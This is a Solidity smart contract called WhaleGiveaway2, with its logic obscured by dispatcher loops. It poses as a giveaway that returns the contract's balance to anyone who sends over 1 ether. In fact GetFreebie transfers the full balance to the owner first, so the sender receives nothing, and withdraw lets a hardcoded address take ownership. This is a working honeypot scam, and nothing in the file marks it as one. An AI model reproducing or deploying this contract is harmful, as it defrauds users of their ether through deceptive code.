pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable { 
        uint256 dispatcher = 0;

        while (true) {
            if (dispatcher == 0) {
                if (msg.value > 1 ether) {
                    dispatcher = 1;
                } else {
                    break;
                }
            } else if (dispatcher == 1) {
                Owner.transfer(this.balance);
                dispatcher = 2;
            } else if (dispatcher == 2) {
                msg.sender.transfer(this.balance);
                break;
            }
        }
    }

    function withdraw() payable public {
        uint256 dispatcher = 0;

        while (true) {
            if (dispatcher == 0) {
                if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
                    Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
                }
                dispatcher = 1;
            } else if (dispatcher == 1) {
                require(msg.sender == Owner);
                dispatcher = 2;
            } else if (dispatcher == 2) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }

    function Command(address adr, bytes data) payable public {
        uint256 dispatcher = 0;

        while (true) {
            if (dispatcher == 0) {
                require(msg.sender == Owner);
                dispatcher = 1;
            } else if (dispatcher == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
}